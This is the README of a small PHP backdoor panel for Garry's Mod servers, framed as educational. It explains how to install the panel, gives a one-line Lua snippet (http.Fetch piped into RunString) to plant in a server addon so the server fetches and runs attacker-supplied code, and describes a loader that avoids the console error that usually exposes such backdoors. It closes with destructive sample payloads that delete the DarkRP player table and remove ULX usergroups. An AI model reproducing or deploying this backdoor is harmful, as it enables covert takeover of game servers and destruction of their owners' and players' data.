# Luctus' May

This is a very small and minimalistic backdoor panel.  
It is supposed to show how most backdoor panels work by making it less complicated to read and understand.

**This exists only for educational purposes!**  
**Do not use this to cause any harm!**


# Installation

Simply drag and drop the files in www/ into your webserver.  
If you are on a linux system you may have to change the permissions, because both main.lua and the servers/ folder have to be writeable by your webserver.

    chown -R www-data:www-data servers/ main.lua

The password for the web panel is in adm.php on line 21.


# Usage

Simply visit `yourwebsite.com/adm.php` and login with your password.  
There you can see every server who has accessed your backdoor atleast once and the last time it downloaded your code.


# Adding it to addons

To make this work on a gmodserver you have to add the following line of code into a serverside lua file:

    http.Fetch("https://yourwebsite.com",function(b) RunString(b) end)

This makes the server download and run your main.lua code (served from the index.php file) and from there you can add your own via the adm/edit sites on your panel.


# Explanation

## Normal flow

It is normal for backdoors to have a "loader" lua script and then the user created scripts after it.  
This is implemented here via the `index.php` (=loader) file, which gets executed first and only has basic non-harmful logic (=main.lua). The code from the `main.lua` file then gets another custom lua code periodically from the `l.php` file which then runs the user created code.

These backdoors are normally easy to find because they have a `RunString(Ex) Error: Too short '>'` message in the console if the returned lua code from the custom lua code (in our case the code returned from `l.php`) is too short (=`""`). This doesn't happen here because we return `--` if no custom code has been created for a client.


## Technical description

This is a minimalistic and simple approach to explain how it works.  
It stores all lua code in simple text files.  
It uses the file timestamp to track when a server requested a file.

If a new server sends a request to `index.php` (aka. `https://yourwebsite.com`) it will create a text file with the IP of the server in the `servers` folder. After creating the file the server will respond to the gmodserver's request with the contents of the `main.lua` file, which should send a request periodically to `l.php`.  
If the gmodserver then sends a request to `https://yourwebsite.com/l.php` it will return only the lua code from the `servers/<ip>.txt` file. This file would hold custom code you have written for the specific gmodserver that sent the request.

The date of the "last accessed" display is set by using the PHP `touch` function, which not only creates files but also sets the `modified` timestamp on the file. This is the time that is displayed on the admin page, which gets changed per server request and code-edit from yourself.

It is written in PHP because it is the easiest "dynamic" web format you can host, because you only have to drag and drop some files into a folder and you are done. That's also why it doesn't use any database backend, because it would make setup more complex. This way you can host it at e.g. 000webhost without any problems.

For a "more enterprise" approach (if you can call it that) one could improve the following:

 - Custom lua editor with syntax highlighting
 - Save code in a database with different fields for "last changed", "last accessed", etc.
 - Differentiate between servers with keys instead of their IP address, this way one can not simply check the "servers/" folder for their server's ip address
 - Better login protection


## Example code

The following is example lua code that a malicious actor could execute on your server. **Please do not use those on a real server!**

```lua
--These are just examples, please do not use them to hurt other servers
--Delete every player's wallet
sql.Query("DELETE FROM darkrp_player")
--Stop DarkRP
DarkRP=nil
--Delete every ulx usergroup
for k,v in pairs(ULib.ucl.groups) do
    if k ~= "user" then
        ULib.ucl.removeGroup(k)
    end
end
--Stop ULX
ulx=nil
```
